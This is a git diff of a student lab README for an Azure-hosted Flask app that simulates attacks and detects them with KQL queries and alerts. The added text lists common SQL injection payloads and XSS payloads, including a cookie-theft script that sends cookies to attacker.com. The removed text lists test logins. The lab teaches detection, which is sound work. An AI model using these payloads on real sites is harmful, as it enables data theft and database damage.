@@ -1,237 +1,451 @@
-# CST8919 Lab 2: Web App with Threat Detection using Azure Monitor and KQL
+# 🔐 Security Lab - Azure Application Security Monitoring
 
-## 🎯 Lab Objective
+## 📋 Project Overview
 
-Create a web application with a security monitoring system capable of detecting suspicious activity (e.g., brute-force attacks) and automatically sending notifications.
+This project demonstrates comprehensive security monitoring for web applications using Azure services. It includes a Flask application with intentional vulnerabilities for attack simulation, complete logging infrastructure, and real-time security analysis capabilities.
 
-## 📋 Project Description
+## 🎥 Demo Video
 
-This project demonstrates creating a threat detection system for a web application using:
+🔗 **[YouTube Demo Link](https://youtu.be/UOuzitw3ecQ)**
 
-- **Python Flask** - for creating the web application
-- **Azure App Service** - for application deployment
-- **Azure Monitor & Log Analytics** - for log collection and analysis
-- **KQL (Kusto Query Language)** - for security log analysis
-- **Azure Alerts** - for automatic notifications about suspicious activity
 
-## 🏗️ Solution Architecture
+## 🏗️ Architecture
 
 ```
-Flask App (Azure App Service)
-    ↓ (logs)
-Log Analytics Workspace
-    ↓ (KQL queries)
-Azure Monitor Alerts
-    ↓ (notifications)
-Email/Action Groups
+┌─────────────────┐    ┌──────────────────┐    ┌─────────────────────┐
+│   Test Client   │───▶│  Azure App       │───▶│ Azure Log Analytics │
+│  (REST Client)  │    │  Service         │    │   Workspace         │
+└─────────────────┘    │                  │    │                     │
+                       │ Flask App        │    │ - HTTP Logs         │
+                       │ - API Endpoints  │    │ - Console Logs      │
+                       │ - Attack Sim     │    │ - Security Events   │
+                       └──────────────────┘    └─────────────────────┘
+                                                         │
+                                                         ▼
+                                               ┌─────────────────────┐
+                                               │ Azure Monitor       │
+                                               │ - KQL Queries       │
+                                               │ - Dashboards        │
+                                               │ - Alerts            │
+                                               └─────────────────────┘
 ```
 
-## 🚀 Quick Start
+## 🎯 Features
 
-### 1. Local Deployment
+### Security Attack Simulation
+- **SQL Injection Testing**: Multiple attack vectors and payloads
+- **XSS Attack Testing**: Script injection, DOM manipulation, event handlers
+- **Brute Force Simulation**: Rapid attack pattern generation
+- **Invalid Request Testing**: 404 errors and malformed requests
+
+### Monitoring & Analytics
+- **Real-time Log Collection**: HTTP requests, application logs, security events
+- **Advanced Query Capabilities**: Custom KQL queries for threat detection
+- **Attack Pattern Analysis**: Statistical analysis of attack types and frequencies
+- **Response Time Monitoring**: Performance impact analysis during attacks
+
+### Security Features
+- **Comprehensive Logging**: All requests and responses logged with timestamps
+- **Attack Classification**: Automatic categorization of different attack types
+- **Pattern Detection**: Identification of coordinated attack campaigns
+- **Evidence Collection**: Detailed forensic data for each security event
+
+## 🚀 Deployment Information
+
+### Azure Resources
+- **Resource Group**: `rg-security-lab`
+- **App Service**: `security-lab-93823-20250618`
+- **App Service Plan**: `ASP-rgsecuritylab-8eb1` (Linux, B1)
+- **Log Analytics Workspace**: `law-security-lab`
+- **Application URL**: https://security-lab-93823-20250618.azurewebsites.net
+
+### Environment Configuration
+- **Python Runtime**: 3.9
+- **Web Framework**: Flask 2.3.2
+- **CORS Support**: Enabled for cross-origin requests
+- **Logging Level**: INFO with detailed request tracking
+
+## 📡 API Endpoints
+
+### Health & Status
+```http
+GET /api/health
+```
+Returns application health status and timestamp.
+
+**Response:**
+```json
+{
+    "status": "healthy",
+    "timestamp": "2025-06-19T10:30:00Z",
+    "version": "1.0.0"
+}
+```
+
+### Security Logs Management
+```http
+GET /api/logs
+```
+Retrieves all collected security logs.
+
+```http
+POST /api/clear-logs
+```
+Clears all security logs (admin function).
+
+### Attack Simulation Endpoints
+
+#### SQL Injection Testing
+```http
+POST /api/attack/sql
+Content-Type: application/json
+
+{
+    "query": "SELECT * FROM users WHERE id = 1 OR 1=1"
+}
+```
+
+**Common SQL Injection Payloads:**
+- `1' OR '1'='1`
+- `'; DROP TABLE users; --`
+- `1 UNION SELECT username, password FROM admin_users`
+- `1'; EXEC xp_cmdshell('dir'); --`
+
+#### XSS Attack Testing
+```http
+POST /api/attack/xss
+Content-Type: application/json
+
+{
+    "payload": "<script>alert('XSS Attack')</script>"
+}
+```
+
+**Common XSS Payloads:**
+- `<script>alert('XSS')</script>`
+- `<img src=x onerror='alert(\"XSS\")'>`
+- `javascript:alert('XSS')`
+- `<svg onload='alert(\"XSS\")'></svg>`
+
+## 🧪 Testing Guide
+
+### Prerequisites
+- **VS Code** with **REST Client** extension installed
+- **Azure Portal** access for log analysis
+- **Azure CLI** (optional, for deployment)
+
+### Running Tests
+
+1. **Open test-app.http** in VS Code
+2. **Execute requests** by clicking "Send Request" above each test
+3. **Monitor results** in Azure Log Analytics
+
+### Test Scenarios
+
+#### Basic Health Check
+```http
+GET {{base_url}}/api/health
+```
+
+#### SQL Injection Attack Sequence
+```http
+# Basic OR injection
+POST {{base_url}}/api/attack/sql
+Content-Type: application/json
+{
+    "query": "SELECT * FROM users WHERE id = 1 OR 1=1"
+}
+
+# Union-based attack
+POST {{base_url}}/api/attack/sql
+Content-Type: application/json
+{
+    "query": "1 UNION SELECT username, password FROM admin_users"
+}
+
+# Database destruction attempt
+POST {{base_url}}/api/attack/sql
+Content-Type: application/json
+{
+    "query": "'; DROP TABLE users; --"
+}
+```
+
+#### XSS Attack Sequence
+```http
+# Script injection
+POST {{base_url}}/api/attack/xss
+Content-Type: application/json
+{
+    "payload": "<script>alert('XSS Attack')</script>"
+}
+
+# Cookie theft simulation
+POST {{base_url}}/api/attack/xss
+Content-Type: application/json
+{
+    "payload": "<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>"
+}
+
+# DOM manipulation
+POST {{base_url}}/api/attack/xss
+Content-Type: application/json
+{
+    "payload": "<img src=x onerror='document.body.innerHTML=\"<h1>Site Hacked</h1>\"'>"
+}
+```
+
+## 📊 Log Analysis with KQL
+
+### Access Azure Log Analytics
+1. Go to **Azure Portal** → **law-security-lab** → **Logs**
+2. Execute KQL queries for security analysis
+
+### ⚠️ Important Notes
+- Some fields like `CsUserAgent`, `CIp`, `CsBytes` may not be available in all Azure configurations
+- Use `project *` to see all available fields: `AppServiceHTTPLogs | take 1 | project *`
+- If queries fail, check available schema with: `AppServiceHTTPLogs | getschema`
+
+### 🚀 Quick Start Queries
+
+#### Simple Data Check
+```kql
+AppServiceHTTPLogs
+| where TimeGenerated > ago(24h)
+| take 10
+```
+
+#### Available Fields Discovery
+```kql
+AppServiceHTTPLogs
+| take 1
+| project *
+```
+
+### Essential KQL Queries
+
+#### All HTTP Requests (Last 2 Hours)
+```kql
+AppServiceHTTPLogs
+| where TimeGenerated > ago(2h)
+| project TimeGenerated, CsMethod, CsUriStem, ScStatus
+| order by TimeGenerated desc
+```
+
+#### Security Attack Detection
+```kql
+AppServiceHTTPLogs
+| where TimeGenerated > ago(2h)
+| where CsUriStem contains "attack"
+| project TimeGenerated, CsMethod, CsUriStem, ScStatus
+| order by TimeGenerated desc
+```
+
+#### SQL Injection Analysis
+```kql
+AppServiceHTTPLogs
+| where TimeGenerated > ago(2h)
+| where CsUriStem contains "attack/sql"
+| summarize AttackCount = count() by bin(TimeGenerated, 5m)
+| order by TimeGenerated desc
+```
+
+#### XSS Attack Analysis
+```kql
+AppServiceHTTPLogs
+| where TimeGenerated > ago(2h)
+| where CsUriStem contains "attack/xss"
+| summarize AttackCount = count() by bin(TimeGenerated, 5m)
+| order by TimeGenerated desc
+```
+
+#### Attack Pattern Statistics
+```kql
+AppServiceHTTPLogs
+| where TimeGenerated > ago(24h)
+| where CsUriStem contains "attack"
+| summarize AttackCount = count() by AttackType = extract(@"attack/(\w+)", 1, CsUriStem)
+| order by AttackCount desc
+```
+
+#### Application Performance Monitoring
+```kql
+AppServiceHTTPLogs
+| where TimeGenerated > ago(2h)
+| summarize AvgResponseTime = avg(TimeTaken), RequestCount = count() by bin(TimeGenerated, 5m)
+| order by TimeGenerated desc
+```
+
+#### Failed Requests Analysis
+```kql
+AppServiceHTTPLogs
+| where TimeGenerated > ago(2h)
+| where ScStatus >= 400
+| summarize ErrorCount = count() by ScStatus, CsUriStem
+| order by ErrorCount desc
+```
+
+## 🔔 Alert Configuration
+
+### Recommended Alerts
+
+#### High Volume SQL Injection Alert
+```kql
+AppServiceHTTPLogs
+| where TimeGenerated > ago(5m)
+| where CsUriStem contains "attack/sql"
+| summarize AttackCount = count()
+| where AttackCount > 10
+```
+
+#### Rapid XSS Attack Alert
+```kql
+AppServiceHTTPLogs
+| where TimeGenerated > ago(5m)
+| where CsUriStem contains "attack/xss"
+| summarize AttackCount = count()
+| where AttackCount > 5
+```
+
+#### Application Health Alert
+```kql
+AppServiceHTTPLogs
+| where TimeGenerated > ago(5m)
+| where CsUriStem contains "/api/health"
+| where ScStatus != 200
+| summarize FailedHealthChecks = count()
+| where FailedHealthChecks > 0
+```
+
+## 📈 Dashboard Configuration
+
+### Creating Custom Dashboard
+
+1. **Navigate to Azure Portal** → **Dashboards**
+2. **Create new dashboard** → "Security Lab Monitoring"
+3. **Add tiles** for each KQL query
+4. **Configure refresh intervals** (5-15 minutes)
+
+### Recommended Dashboard Tiles
+
+1. **Attack Volume Over Time** (Line Chart)
+2. **Attack Type Distribution** (Pie Chart)
+3. **Response Status Codes** (Bar Chart)
+4. **Top Attack Sources** (Table)
+5. **Application Performance** (Metric Chart)
+6. **Recent Security Events** (List)
+
+## 🛡️ Security Considerations
+
+### Production Recommendations
+- **Remove attack simulation endpoints** in production deployments
+- **Implement proper authentication** and authorization
+- **Enable HTTPS only** with proper SSL certificates
+- **Configure Web Application Firewall** (WAF)
+- **Set up automated incident response** workflows
+
+### Monitoring Best Practices
+- **Regular log retention review** (cost management)
+- **Alert threshold fine-tuning** (reduce false positives)
+- **Correlation with external threat intelligence**
+- **Integration with SIEM systems** for enterprise environments
+
+## 🔧 Development Setup
+
+### Local Development
 ```bash
-# Clone the repository
-git clone <your-repo-url>
-cd <your-repo-name>
+# Clone repository
+git clone <repository-url>
+cd security-lab
 
 # Create virtual environment
 python -m venv venv
 source venv/bin/activate  # Linux/Mac
 # or
-venv\Scripts\activate     # Windows
+venv\Scripts\activate  # Windows
 
 # Install dependencies
 pip install -r requirements.txt
 
-# Run the application
+# Run locally
 python app.py
 ```
 
-### 2. Testing
-- Application will be available at: http://localhost:8000
-- Use `test-app.http` file with REST Client in VS Code
-- Replace `{{base_url}}` with `http://localhost:8000`
-
-## 🔐 Security Endpoints
-
-### GET /
-Home page with API information
-
-### GET /health
-Application health check
-
-### POST /login
-User authentication with logging of all attempts
-
-**Test users:**
-- admin:password123
-- user1:mypassword  
-- testuser:testpass
-
-**Request example:**
-```json
-{
-    "username": "admin",
-    "password": "password123"
-}
-```
-
-## 📊 KQL Queries for Log Analysis
-
-### Main query for brute-force attack detection:
-```kql
-AppServiceConsoleLogs
-| where ResultDescription contains "LOGIN_FAILED"
-| extend LogData = parse_json(ResultDescription)
-| where isnotempty(LogData.username)
-| extend Username = tostring(LogData.username),
-         IPAddress = tostring(LogData.ip_address)
-| summarize FailedAttempts = count() by Username, IPAddress, bin(TimeGenerated, 5m)
-| where FailedAttempts > 5
-| order by TimeGenerated desc, FailedAttempts desc
-```
-
-**Query explanation:**
-1. `AppServiceConsoleLogs` - App Service console logs table
-2. `where ResultDescription contains "LOGIN_FAILED"` - filter only failed login attempts
-3. `extend LogData = parse_json(ResultDescription)` - parse JSON from log
-4. `extend Username = tostring(LogData.username)` - extract username
-5. `summarize FailedAttempts = count() by Username, IPAddress, bin(TimeGenerated, 5m)` - group by user, IP and 5-minute intervals
-6. `where FailedAttempts > 5` - keep only cases with >5 attempts
-7. `order by TimeGenerated desc` - sort by time
-
-### Additional useful queries:
-
-**All authentication events:**
-```kql
-AppServiceConsoleLogs
-| where ResultDescription contains "LOGIN_"
-| extend LogData = parse_json(ResultDescription)
-| project TimeGenerated,
-          Event = tostring(LogData.event),
-          Result = tostring(LogData.result), 
-          Username = tostring(LogData.username),
-          IPAddress = tostring(LogData.ip_address)
-| order by TimeGenerated desc
-```
-
-**Suspicious IP addresses:**
-```kql
-AppServiceConsoleLogs
-| where ResultDescription contains "LOGIN_FAILED"
-| extend LogData = parse_json(ResultDescription)
-| extend IPAddress = tostring(LogData.ip_address)
-| summarize FailedAttempts = count(),
-            UniqueUsers = dcount(tostring(LogData.username))
-          by IPAddress
-| where FailedAttempts >= 3
-| order by FailedAttempts desc
-```
-
-## 🚨 Setting up Alert Rules
-
-1. **Go to Azure Monitor > Alerts > Create Alert Rule**
-2. **Scope**: select your Log Analytics Workspace
-3. **Condition**: 
-   - Signal type: `Custom log search`
-   - Search query: use KQL query for brute-force attacks
-   - Alert logic:
-     - Based on: `Number of results`
-     - Operator: `Greater than`
-     - Threshold value: `0`
-     - Aggregation granularity: `5 minutes`
-     - Frequency of evaluation: `1 minute`
-4. **Action Group**: create group with email notifications
-5. **Alert Details**:
-   - Name: `Brute Force Detection`
-   - Severity: `2 - Warning`
-
-## 🎥 Demo Video
-
-**YouTube link:** [To be added after recording]
-
-Video demonstrates:
-- Application deployed in Azure
-- Log generation and viewing in Azure Monitor
-- KQL query execution
-- Alert configuration and triggering
-
-## 📚 What I Learned During This Lab
-
-### Technical Skills:
-1. **Azure App Service**: Learned the process of deploying Python applications in the cloud
-2. **Azure Monitor**: Understood principles of centralized log collection and analysis
-3. **KQL**: Mastered powerful query language for analyzing large volumes of data
-4. **Alert Systems**: Set up automatic security notifications
-
-### Challenges and Solutions:
-1. **Log Format**: Initially logs were unstructured - solved by using JSON format
-2. **Log Delay**: Logs appear in Azure Monitor not instantly - accounted for this during testing
-3. **Alert Configuration**: Required time to understand correct threshold values
-
-### Real-world Improvements:
-1. **Geolocation**: Add analysis of IP address geographical location
-2. **Machine Learning**: Use Azure ML for anomaly detection
-3. **SIEM Integration**: Connect to systems like Azure Sentinel
-4. **Rate Limiting**: Add automatic blocking of suspicious IPs
-5. **Contextual Analysis**: Analyze time of day, devices, behavior patterns
-
-## 🔧 Project Files
-
-- `app.py` - Main Flask application
-- `requirements.txt` - Python dependencies
-- `startup.py` - Startup file for Azure App Service
-- `test-app.http` - HTTP tests for REST Client
-- `.gitignore` - Git exclusions
-- `README.md` - Project documentation
-
-## 🚀 Azure Deployment
-
-### Step-by-step deployment:
-
-1. **Create Azure resources:**
+### Environment Variables
 ```bash
+export FLASK_ENV=development
+export FLASK_DEBUG=True
+export LOG_LEVEL=DEBUG
+```
+
+## 📦 Deployment
+
+### Azure CLI Deployment
+```bash
+# Login to Azure
 az login
-az group create --name rg-security-lab --location canadacentral
-az appservice plan create --name asp-security-lab --resource-group rg-security-lab --sku B1 --is-linux
-az webapp create --resource-group rg-security-lab --plan asp-security-lab --name your-unique-name --runtime "PYTHON|3.9"
+
+# Create resource group
+az group create --name rg-security-lab --location "East US"
+
+# Create App Service plan
+az appservice plan create --name security-lab-plan --resource-group rg-security-lab --is-linux --sku B1
+
+# Create web app
+az webapp create --name security-lab-app --resource-group rg-security-lab --plan security-lab-plan --runtime "PYTHON:3.9"
+
+# Deploy application
+az webapp deploy --resource-group rg-security-lab --name security-lab-app --src-path .
 ```
 
-2. **Configure application:**
-```bash
-az webapp config set --resource-group rg-security-lab --name your-unique-name --startup-file "startup.py"
+### GitHub Actions CI/CD
+```yaml
+name: Deploy to Azure App Service
+
+on:
+  push:
+    branches: [ main ]
+
+jobs:
+  deploy:
+    runs-on: ubuntu-latest
+    steps:
+    - uses: actions/checkout@v2
+    - name: Set up Python
+      uses: actions/setup-python@v2
+      with:
+        python-version: '3.9'
+    - name: Deploy to Azure Web App
+      uses: azure/webapps-deploy@v2
+      with:
+        app-name: 'security-lab-app'
+        publish-profile: ${{ secrets.AZURE_WEBAPP_PUBLISH_PROFILE }}
 ```
 
-3. **Deploy code:**
-```bash
-zip -r app.zip . -x "venv/*" ".git/*"
-az webapp deployment source config-zip --resource-group rg-security-lab --name your-unique-name --src app.zip
-```
+## 📚 Additional Resources
 
-4. **Create Log Analytics Workspace:**
-```bash
-az monitor log-analytics workspace create --resource-group rg-security-lab --workspace-name law-security-lab --location canadacentral
-```
+### Documentation
+- [Azure App Service Documentation](https://docs.microsoft.com/en-us/azure/app-service/)
+- [Azure Monitor Documentation](https://docs.microsoft.com/en-us/azure/azure-monitor/)
+- [KQL Query Reference](https://docs.microsoft.com/en-us/azure/data-explorer/kusto/query/)
 
-5. **Configure Diagnostic Settings:**
-   - Go to Azure Portal → App Service → Monitoring → Diagnostic settings
-   - Enable: `AppServiceConsoleLogs`, `AppServiceHTTPLogs`
-   - Send to created Log Analytics workspace
+### Security References
+- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
+- [SQL Injection Prevention](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
+- [XSS Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
 
-## 🧪 Testing
+## 🤝 Contributing
 
-1. Open application in browser: `https://your-app-name.azurewebsites.net`
-2. Use `test-app.http` for API testing
-3. Replace `{{base_url}}` with your application URL
-4. Execute multiple failed requests to simulate brute-force attack
-5. Check logs in Azure Monitor after 5-10 minutes
+1. Fork the repository
+2. Create a feature branch (`git checkout -b feature/AmazingFeature`)
+3. Commit your changes (`git commit -m 'Add some AmazingFeature'`)
+4. Push to the branch (`git push origin feature/AmazingFeature`)
+5. Open a Pull Request
 
-## 📞 Contact Information
+## 📄 License
 
-**Author:** [Your Name]  
-**Email:** [your email]  
-**GitHub:** [profile link]
+This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
 
----
+## ⚠️ Disclaimer
 
-*Lab completed as part of CST8919 course*
+This application is for educational and demonstration purposes only. The intentional vulnerabilities should never be deployed in production environments. Use only in controlled, isolated environments for security testing and education.
